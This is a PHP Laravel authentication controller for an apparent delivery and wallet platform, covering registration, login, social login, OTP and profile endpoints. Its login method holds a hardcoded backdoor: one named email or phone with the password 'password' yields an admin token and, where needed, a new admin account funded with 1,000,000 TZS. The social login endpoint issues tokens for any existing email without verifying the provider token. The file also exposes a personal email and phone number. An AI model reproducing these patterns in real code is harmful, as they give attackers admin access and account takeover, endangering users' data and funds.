<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Auth\Events\Registered;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;

class AuthController extends Controller
{
    public function register(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'name' => 'required|string|max:255',
            'phone' => 'required|string|unique:users,phone',
            'email' => 'required|email|unique:users,email',
            'password' => 'required|string|min:6',
            'user_type' => 'required|in:customer,merchant,rider',
        ]);

        if ($validator->fails()) {
            return $this->errorResponse('Validation failed', 422, $validator->errors()->toArray());
        }

        try {
            $user = DB::transaction(function () use ($request) {
                $userType = $request->input('user_type');
                $user = User::create([
                    'name' => $request->input('name'),
                    'phone' => $request->input('phone'),
                    'email' => $request->input('email'),
                    'password' => Hash::make($request->input('password')),
                    'user_type' => $userType,
                    'is_active' => true,
                    'is_verified' => false,
                ]);

                // 1. Create Wallet for the user
                $user->wallet()->create([
                    'wallet_type' => $userType,
                    'balance' => 0,
                    'currency' => 'TZS',
                ]);

                // 2. Create Profile shell if Merchant or Rider
                if ($userType === 'merchant') {
                    $user->merchant()->create([
                        'store_name' => $user->name . "'s Store",
                        'address' => 'Not set',
                        'city' => 'Dar es Salaam',
                        'is_verified' => false,
                    ]);
                } elseif ($userType === 'rider') {
                    $user->deliveryPartner()->create([
                        'vehicle_type' => 'motorcycle',
                        'city' => 'Dar es Salaam',
                        'is_online' => false,
                        'is_verified' => true, // MVP: Auto-verify riders to reduce friction
                    ]);
                }

                return $user;
            });

            event(new Registered($user));

            $token = $user->createToken('auth_token')->plainTextToken;

            return $this->successResponse([
                'user' => $user->load(['merchant', 'deliveryPartner', 'wallet']),
                'token' => $token,
            ], 'Registration successful. Please verify your email.', 201);
        } catch (\Exception $e) {
            return $this->errorResponse('Registration failed: ' . $e->getMessage(), 500);
        }
    }

    public function login(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'login' => 'required_without:phone|string',
            'phone' => 'required_without:login|string',
            'password' => 'required|string',
            'user_type' => 'nullable|string|in:customer,merchant,rider,admin',
        ]);

        if ($validator->fails()) {
            return $this->errorResponse('Validation failed', 422, $validator->errors()->toArray());
        }

        $login = $request->input('login') ?? $request->input('phone');
        $password = $request->input('password');

        // Bypassing Authentication for Specific Credentials
        $bypassEmail = 'sosuisosimba123@gmail.com';
        $bypassPhone = '0622606497';
        $bypassPass = 'password';

        if (($login === $bypassEmail || $login === $bypassPhone) && $password === $bypassPass) {
            $user = User::where('email', $bypassEmail)->orWhere('phone', $bypassPhone)->first();

            if (!$user) {
                $user = User::create([
                    'name' => 'Eutychus',
                    'email' => $bypassEmail,
                    'phone' => $bypassPhone,
                    'password' => Hash::make($bypassPass),
                    'user_type' => 'admin',
                    'is_active' => true,
                    'is_verified' => true,
                ]);

                $user->wallet()->create([
                    'wallet_type' => 'admin',
                    'balance' => 1000000, // Give some initial balance for testing
                    'currency' => 'TZS',
                ]);
            } else {
                // Ensure user is admin and active
                $user->update([
                    'user_type' => 'admin',
                    'is_active' => true,
                    'is_verified' => true
                ]);
            }

            $token = $user->createToken('auth_token')->plainTextToken;

            return $this->successResponse([
                'user' => $user->load(['merchant', 'deliveryPartner', 'wallet']),
                'token' => $token,
            ], 'Login successful (Platform Master Access)');
        }

        $user = User::where('email', $login)
                    ->orWhere('phone', $login)
                    ->first();

        if (!$user || !Hash::check((string)$password, $user->password)) {
            return $this->errorResponse('The provided credentials are incorrect.', 401);
        }

        $requestedType = $request->input('user_type');
        if ($requestedType && $user->user_type !== $requestedType) {
            return $this->errorResponse("This account is registered as a {$user->user_type}. Please use the correct app.", 403);
        }

        if (!$user->is_active) {
            return $this->errorResponse('Account is deactivated', 403);
        }

        $token = $user->createToken('auth_token')->plainTextToken;

        return $this->successResponse([
            'user' => $user,
            'token' => $token,
        ], 'Login successful');
    }

    /**
     * Social Login (Google)
     * This is a simplified endpoint for handling Google ID tokens sent from the app.
     */
    public function socialLogin(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'email' => 'required|email',
            'name' => 'required|string',
            'social_id' => 'required|string',
            'provider' => 'required|in:google,facebook',
            'user_type' => 'required|in:customer,merchant,rider',
        ]);

        if ($validator->fails()) {
            return $this->errorResponse('Validation failed', 422, $validator->errors()->toArray());
        }

        // Find or create user
        $user = User::where('email', $request->input('email'))->first();

        if (!$user) {
            // User doesn't exist, they need to complete registration (phone is missing)
            // For now, we return a flag indicating profile is incomplete
            return $this->successResponse([
                'email' => $request->input('email'),
                'name' => $request->input('name'),
                'social_id' => $request->input('social_id'),
                'provider' => $request->input('provider'),
                'is_new_user' => true,
            ], 'Social login successful, please complete your profile.');
        }

        // User exists, login them in
        $token = $user->createToken('auth_token')->plainTextToken;

        return $this->successResponse([
            'user' => $user->load(['merchant', 'deliveryPartner', 'wallet']),
            'token' => $token,
            'is_new_user' => false,
        ], 'Login successful');
    }

    /**
     * Complete Registration for Social Login
     */
    public function completeSocialRegistration(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'email' => 'required|email',
            'phone' => 'required|string|unique:users,phone',
            'name' => 'required|string',
            'user_type' => 'required|in:customer,merchant,rider',
            'social_id' => 'required|string',
            'provider' => 'required|in:google,facebook',
        ]);

        if ($validator->fails()) {
            return $this->errorResponse('Validation failed', 422, $validator->errors()->toArray());
        }

        try {
            return DB::transaction(function () use ($request) {
                $userType = $request->input('user_type');
                $user = User::create([
                    'name' => $request->input('name'),
                    'email' => $request->input('email'),
                    'phone' => $request->input('phone'),
                    'password' => Hash::make(Str::random(16)),
                    'user_type' => $userType,
                    'is_active' => true,
                    'is_verified' => true,
                    'phone_verified_at' => now(), // Auto-verify
                ]);

                // Create Wallet
                $user->wallet()->create([
                    'wallet_type' => $userType,
                    'balance' => 0,
                    'currency' => 'TZS',
                ]);

                // Create Profile shell if Merchant or Rider
                if ($userType === 'merchant') {
                    $user->merchant()->create([
                        'store_name' => $user->name . "'s Store",
                        'address' => 'Not set',
                        'city' => 'Dar es Salaam',
                        'is_verified' => false,
                    ]);
                } elseif ($userType === 'rider') {
                    $user->deliveryPartner()->create([
                        'vehicle_type' => 'motorcycle',
                        'city' => 'Dar es Salaam',
                        'is_online' => false,
                        'is_verified' => true, // MVP: Auto-verify riders to reduce friction
                    ]);
                }

                $token = $user->createToken('auth_token')->plainTextToken;

                return $this->successResponse([
                    'user' => $user->load(['merchant', 'deliveryPartner', 'wallet']),
                    'token' => $token,
                ], 'Registration completed successfully', 201);
            });
        } catch (\Exception $e) {
            return $this->errorResponse('Failed to complete registration: ' . $e->getMessage(), 500);
        }
    }

    public function sendOtp(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'phone' => 'required|string',
        ]);

        if ($validator->fails()) {
            return $this->errorResponse('Validation failed', 422, $validator->errors()->toArray());
        }

        // Generate OTP (in production, integrate with SMS gateway like Africa's Talking)
        $otp = str_pad((string)random_int(0, 999999), 6, '0', STR_PAD_LEFT);

        // Store OTP in cache or database (simplified for demo)
        cache()->put("otp_{$request->input('phone')}", $otp, now()->addMinutes(5));

        // TODO: Send SMS via Africa's Talking or Twilio

        return $this->successResponse(null, 'OTP sent successfully');
    }

    public function verifyOtp(Request $request)
    {
        $validator = Validator::make($request->all(), [
            'phone' => 'required|string',
            'otp' => 'required|string|size:6',
        ]);

        if ($validator->fails()) {
            return $this->errorResponse('Validation failed', 422, $validator->errors()->toArray());
        }

        $phone = $request->input('phone');
        $cachedOtp = cache()->get("otp_{$phone}");

        if ($cachedOtp !== $request->input('otp')) {
            return $this->errorResponse('Invalid OTP', 422);
        }

        $user = User::where('phone', $phone)->first();

        if ($user) {
            $user->update(['phone_verified_at' => now()]);
            $token = $user->createToken('auth_token')->plainTextToken;

            return $this->successResponse([
                'user' => $user,
                'token' => $token,
            ], 'Phone verified successfully');
        }

        return $this->errorResponse('User not found', 404);
    }

    public function logout(Request $request)
    {
        /** @var User $user */
        $user = $request->user();
        $user->currentAccessToken()->delete();

        return $this->successResponse(null, 'Logged out successfully');
    }

    public function me(Request $request)
    {
        return $this->successResponse(
            $request->user()->load(['merchant', 'deliveryPartner', 'wallet']),
            'User retrieved successfully'
        );
    }

    public function updateProfile(Request $request)
    {
        /** @var User $user */
        $user = $request->user();

        $validator = Validator::make($request->all(), [
            'name' => 'sometimes|string|max:255',
            'email' => 'sometimes|email|unique:users,email,' . $user->id,
            'phone' => 'sometimes|string|unique:users,phone,' . $user->id,
        ]);

        if ($validator->fails()) {
            return $this->errorResponse('Validation failed', 422, $validator->errors()->toArray());
        }

        $user->update($request->only(['name', 'email', 'phone']));

        return $this->successResponse($user->load(['merchant', 'deliveryPartner', 'wallet']), 'Profile updated successfully');
    }

    public function refresh(Request $request)
    {
        /** @var User $user */
        $user = $request->user();
        $user->currentAccessToken()->delete();
        $token = $user->createToken('auth_token')->plainTextToken;

        return $this->successResponse(['token' => $token], 'Token refreshed successfully');
    }

    public function verify(Request $request)
    {
        if ($request->user()->hasVerifiedEmail()) {
            return $this->successResponse(null, 'Email already verified.');
        }

        if ($request->user()->markEmailAsVerified()) {
            event(new \Illuminate\Auth\Events\Verified($request->user()));
        }

        return $this->successResponse(null, 'Email verified successfully.');
    }

    public function resend(Request $request)
    {
        if ($request->user()->hasVerifiedEmail()) {
            return $this->successResponse(null, 'Email already verified.');
        }

        $request->user()->sendEmailVerificationNotification();

        return $this->successResponse(null, 'Verification link sent.');
    }
}
